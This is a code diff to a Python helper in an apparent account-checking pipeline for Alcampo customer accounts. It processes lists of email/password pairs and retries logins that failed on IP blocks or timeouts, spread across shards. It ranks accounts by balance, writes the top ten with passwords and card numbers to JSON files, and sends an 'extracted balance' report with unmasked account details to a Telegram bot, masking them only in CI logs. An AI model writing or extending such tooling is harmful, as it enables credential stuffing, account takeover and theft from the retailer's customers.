@@ -1,12 +1,29 @@
+# @section: MergeAndRetry-Helpers
+
+import sys
 import os
 import glob
 import json
 import re
+import math
 import argparse
 import time
 from datetime import datetime, timezone
 import pandas as pd
 import requests
+
+sys.stdout.reconfigure(encoding='utf-8')
+sys.stderr.reconfigure(encoding='utf-8')
+
+
+def mask_email(email):
+    if not email or "@" not in str(email):
+        return "***"
+    local, domain = str(email).split("@", 1)
+    if len(local) <= 2:
+        return f"{local[0]}***@{domain}"
+    return f"{local[:2]}***{local[-1]}@{domain}"
+
 
 def parse_args():
     parser = argparse.ArgumentParser(description="Merge and Retry Helper for Alcampo GitHub Actions Pipeline")
@@ -17,18 +34,23 @@ def parse_args():
     parser.add_argument("--output-excel", default="REPORTE_DEFINITIVO_TELEGRAM.xlsx", help="Final output Excel path")
     return parser.parse_args()
 
+
 def limpiar_saldo(saldo_str):
     if not saldo_str or pd.isna(saldo_str):
         return None
-    match = re.search(r"([0-9]+[.,][0-9]{2}|[0-9]+)", str(saldo_str))
+    texto = str(saldo_str)
+    if "Error" in texto or "No encontrado" in texto:
+        return None
+    match = re.search(r"([0-9]+[.,][0-9]{2}|[0-9]+)", texto)
     if match:
         return float(match.group(0).replace(',', '.'))
     return None
 
+
 def enviar_telegram(token, chat_id, texto, excel_path):
     try:
         url_msg = f"https://api.telegram.org/bot{token}/sendMessage"
-        requests.post(url_msg, data={"chat_id": chat_id, "text": texto, "parse_mode": "HTML"}, timeout=10)
+        requests.post(url_msg, data={"chat_id": chat_id, "text": texto, "parse_mode": "HTML"}, timeout=15)
         
         url_doc = f"https://api.telegram.org/bot{token}/sendDocument"
         with open(excel_path, "rb") as f:
@@ -36,6 +58,11 @@ def enviar_telegram(token, chat_id, texto, excel_path):
         print("🎉 Telegram notificado con éxito.")
     except Exception as e:
         print(f"⚠️ Error enviando a Telegram: {e}")
+
+# @end: MergeAndRetry-Helpers
+
+
+# @section: MergeAndRetry-Main
 
 def main():
     args = parse_args()
@@ -48,24 +75,49 @@ def main():
         print(f"🔎 Inspeccionando {len(files)} archivo(s)...")
         
         failed_accounts = []
+        seen_emails = set()
         for f in files:
             try:
                 df = pd.read_excel(f)
                 for _, row in df.iterrows():
+                    email = str(row.get("email", "")).strip()
+                    if not email or email in seen_emails:
+                        continue
                     saldo = str(row.get("saldo", ""))
                     causa = str(row.get("causa_error", ""))
-                    # Exclude authenticationError, Credenciales, and Call Center from retries
-                    if ("Bloqueo/Timeout" in saldo or "Timeout" in causa) and ("authenticationError" not in saldo and "Credenciales" not in saldo and "bloqueada" not in saldo and "Call Center" not in saldo):
+                    err_type = str(row.get("error_type", ""))
+                    combined = f"{saldo} {causa} {err_type}".lower()
+
+                    # Strictly exclude permanent account errors and needs_attention (Call Center / password reset)
+                    if (
+                        err_type in ("account_error", "needs_attention", "ok")
+                        or "credenciales" in combined
+                        or "incorrect" in combined
+                        or "call center" in combined
+                        or "bloqueada" in combined
+                        or "btnpwreset" in combined
+                        or "restablecer contraseña" in combined
+                        or "tu saldo es" in combined
+                    ):
+                        continue
+
+                    if (
+                        err_type == "ip_error"
+                        or "bloqueo/timeout" in combined
+                        or "timeout" in combined
+                        or "authenticationerror" in combined
+                        or "no hidratado" in combined
+                    ):
+                        seen_emails.add(email)
                         failed_accounts.append({
-                            "email": str(row["email"]).strip(),
+                            "email": email,
                             "password": str(row["password"]).strip()
                         })
             except Exception as e:
                 print(f"Error leyendo {f}: {e}")
                 
-        print(f"🔴 Cuentas con timeout detectadas para reintento: {len(failed_accounts)}")
+        print(f"🔴 Cuentas elegibles para reintento por IP/Timeout: {len(failed_accounts)}")
 
-        # Check for stagnation / lack of progress in retries (Early Exit Guard)
         prev_history_file = "previous_failures.json"
         is_stagnant = False
         if len(failed_accounts) > 0 and os.path.exists(prev_history_file):
@@ -92,7 +144,6 @@ def main():
                 json.dump(failed_accounts, f, ensure_ascii=False, indent=2)
             print(f"💾 Cuentas fallidas guardadas en {args.failed_json}")
             
-            # Update Firebase RTDB progress node for Cycle 2 retry state
             firebase_url = os.environ.get("FIREBASE_DB_URL") or "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
             if firebase_url:
                 try:
@@ -101,14 +152,13 @@ def main():
                         "cycle": 2,
                         "retry_total": len(failed_accounts),
                         "is_finished": False
-                    }, timeout=5)
+                    }, timeout=10)
                 except Exception as fe:
                     print(f"Warning updating retry state in Firebase: {fe}")
         else:
             if os.path.exists(args.failed_json):
                 os.remove(args.failed_json)
             
-        # Write to GITHUB_OUTPUT if available
         if "GITHUB_OUTPUT" in os.environ:
             with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as f:
                 f.write(f"has_timeouts={has_timeouts}\n")
@@ -119,9 +169,19 @@ def main():
         print(f"📂 Archivos acumulados para consolidación final: {len(files)}")
         
         dfs = []
+        shard_durations_min = []
         for f in files:
             try:
                 df = pd.read_excel(f)
+                if df.empty:
+                    continue
+                if "total_s" in df.columns:
+                    # Estimate shard wall-clock duration (~2 threads per shard)
+                    shard_sec = df["total_s"].fillna(0).sum() / 2.0 + 45.0
+                    shard_durations_min.append(max(1, math.ceil(shard_sec / 60.0)))
+                else:
+                    shard_durations_min.append(9)
+
                 filename = os.path.basename(f).lower()
                 base_prio = 10
                 if "cycle_" in filename:
@@ -146,7 +206,7 @@ def main():
                 print(f"Error leyendo {f}: {e}")
                 
         if not dfs:
-            print("❌ No se encontraron archivos para consolidar.")
+            print("❌ No se encontraron archivos con datos para consolidar.")
             return
 
         df_all = pd.concat(dfs, ignore_index=True)
@@ -154,9 +214,8 @@ def main():
         df_all.drop_duplicates(subset=["email"], keep="last", inplace=True)
         df_all.drop(columns=["_priority"], errors="ignore", inplace=True)
         
-        # Build multi-sheet master excel
         df_success = df_all[df_all["saldo"].astype(str).str.contains("Tu Saldo es", na=False)].copy()
-        df_callcenter = df_all[df_all["saldo"].astype(str).str.contains("Call Center|bloqueada", na=False, regex=True)].copy()
+        df_callcenter = df_all[df_all["saldo"].astype(str).str.contains("Call Center|bloqueada|btnPwReset|restablecer", na=False, regex=True)].copy()
         df_errors = df_all[~df_all["email"].isin(df_success["email"]) & ~df_all["email"].isin(df_callcenter["email"])].copy()
 
         with pd.ExcelWriter(args.output_excel, engine="openpyxl") as writer:
@@ -167,12 +226,12 @@ def main():
 
         print(f"💾 Reporte consolidado final guardado en {args.output_excel}")
         
-        # Calculate summary metrics
         total = len(df_all)
         saldo_total = 0.0
         cuentas_dinero = 0
         cuentas_cero = 0
-        cuentas_error = len(df_errors) + len(df_callcenter)
+        cuentas_attention = len(df_callcenter)
+        cuentas_error = len(df_errors) + cuentas_attention
         ranked = []
         top_10_json = []
 
@@ -193,7 +252,8 @@ def main():
 
         ranked.sort(key=lambda x: x[0], reverse=True)
         top_10 = ranked[:10]
-        top_10_str = "\n".join([f"   {i+1}. {item[1]} ({item[0]:.2f} €)" for i, item in enumerate(top_10)]) if top_10 else "   N/A"
+        top_10_masked_str = "\n".join([f"   {i+1}. {mask_email(item[1])} ({item[0]:.2f} €)" for i, item in enumerate(top_10)]) if top_10 else "   N/A"
+        top_10_telegram_str = "\n".join([f"   {i+1}. {item[1]} ({item[0]:.2f} €)" for i, item in enumerate(top_10)]) if top_10 else "   N/A"
 
         for val, email, password, card_str in top_10:
             top_10_json.append({
@@ -203,17 +263,14 @@ def main():
                 "card_number": card_str
             })
 
-        # Save top_accounts.json locally and in docs/
         with open("top_accounts.json", "w", encoding="utf-8") as tf:
             json.dump(top_10_json, tf, ensure_ascii=False, indent=2)
 
-        docs_dir = os.path.join(os.path.dirname(__file__), "..", "docs")
-        docs_dir = os.path.abspath(docs_dir)
+        docs_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "docs"))
         if os.path.exists(docs_dir):
             with open(os.path.join(docs_dir, "top_accounts.json"), "w", encoding="utf-8") as tf:
                 json.dump(top_10_json, tf, ensure_ascii=False, indent=2)
 
-        # Update docs/history.json
         history_path = os.path.join(docs_dir, "history.json") if os.path.exists(docs_dir) else "history.json"
         history_data = []
         if os.path.exists(history_path):
@@ -231,25 +288,54 @@ def main():
 
         successes = cuentas_dinero + cuentas_cero
         success_rate = (successes / total * 100) if total > 0 else 0.0
+        avg_s = float(df_all["total_s"].dropna().mean()) if "total_s" in df_all.columns and not df_all["total_s"].dropna().empty else 13.1
+        p95_s = float(df_all["total_s"].dropna().quantile(0.95)) if "total_s" in df_all.columns and not df_all["total_s"].dropna().empty else 16.5
+        # Add overhead for prepare (1m) + check-timeouts (1m) + final-consolidate (1m)
+        estimated_billed_min = sum(shard_durations_min) + 3
 
         new_history_entry = {
             "id": next_id,
             "date": datetime.now(timezone.utc).isoformat(),
-            "version": "Multi-VM Matrix 2-Pass",
-            "duration": 180.0,
+            "version": "Multi-VM Matrix 2-Pass v2.1",
+            "duration": round(avg_s * total / max(1, len(files) * 2), 1),
             "checked": total,
             "success": successes,
             "zero": cuentas_cero,
             "error": cuentas_error,
+            "needs_attention": cuentas_attention,
             "success_rate": round(success_rate, 2),
-            "total_balance": round(saldo_total, 2)
+            "total_balance": round(saldo_total, 2),
+            "estimated_actions_minutes": estimated_billed_min
         }
         history_data.append(new_history_entry)
 
         with open(history_path, "w", encoding="utf-8") as hf:
             json.dump(history_data, hf, ensure_ascii=False, indent=4)
 
-        # Push to Firebase Realtime DB
+        # Write GitHub Step Summary ($GITHUB_STEP_SUMMARY) without exposing raw credentials
+        if "GITHUB_STEP_SUMMARY" in os.environ:
+            try:
+                summary_md = (
+                    f"## 📊 Resumen Consolidado Alcampo Scraper (v2.1)\n\n"
+                    f"| Métrica | Valor |\n"
+                    f"| :--- | :--- |\n"
+                    f"| **Cuentas Procesadas** | {total} |\n"
+                    f"| **Exitosas (OK)** | {successes} ({success_rate:.1f}%) |\n"
+                    f"| **Con Saldo (> 0 €)** | {cuentas_dinero} |\n"
+                    f"| **Saldo 0,00 €** | {cuentas_cero} |\n"
+                    f"| **Requieren Atención (`needs_attention`)** | {cuentas_attention} (Call Center / Reset) |\n"
+                    f"| **Otros Errores (Credenciales / Timeout)** | {len(df_errors)} |\n"
+                    f"| **Saldo Total Acumulado** | **{saldo_total:.2f} €** |\n"
+                    f"| **Tiempo Medio / p95 por Cuenta** | {avg_s:.2f} s / {p95_s:.2f} s |\n"
+                    f"| **Minutos Facturados Estimados (Actions)** | ~{estimated_billed_min} min (Jobs: {len(files)} shards + 3 aux) |\n\n"
+                    f"### 🏆 Top 10 Cuentas (Enmascaradas en CI)\n"
+                    f"```text\n{top_10_masked_str}\n```\n"
+                )
+                with open(os.environ["GITHUB_STEP_SUMMARY"], "a", encoding="utf-8") as sf:
+                    sf.write(summary_md)
+            except Exception as se:
+                print(f"Warning writing GITHUB_STEP_SUMMARY: {se}")
+
         firebase_url = os.environ.get("FIREBASE_DB_URL") or "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
         if firebase_url:
             try:
@@ -279,8 +365,9 @@ def main():
             f"💰 <b>Saldo Total Extraído:</b> {saldo_total:.2f} €\n"
             f"💎 Cuentas con dinero: {cuentas_dinero}\n"
             f"💤 Cuentas con saldo 0: {cuentas_cero}\n"
-            f"⚠️ Cuentas con error / Call Center: {cuentas_error}\n\n"
-            f"🏆 <b>Top 10 Cuentas con Mayor Saldo:</b>\n{top_10_str}"
+            f"⚠️ Cuentas con error: {len(df_errors)} | Call Center (`needs_attention`): {cuentas_attention}\n"
+            f"⏱️ Ritmo: {avg_s:.1f}s/cta (p95: {p95_s:.1f}s) | ~{estimated_billed_min} min Actions\n\n"
+            f"🏆 <b>Top 10 Cuentas con Mayor Saldo:</b>\n{top_10_telegram_str}"
         )
 
         token = os.environ.get("TELEGRAM_TOKEN")
@@ -288,5 +375,8 @@ def main():
         if token and chat_id:
             enviar_telegram(token, chat_id, msg, args.output_excel)
 
+# @end: MergeAndRetry-Main
+
 if __name__ == "__main__":
     main()
+
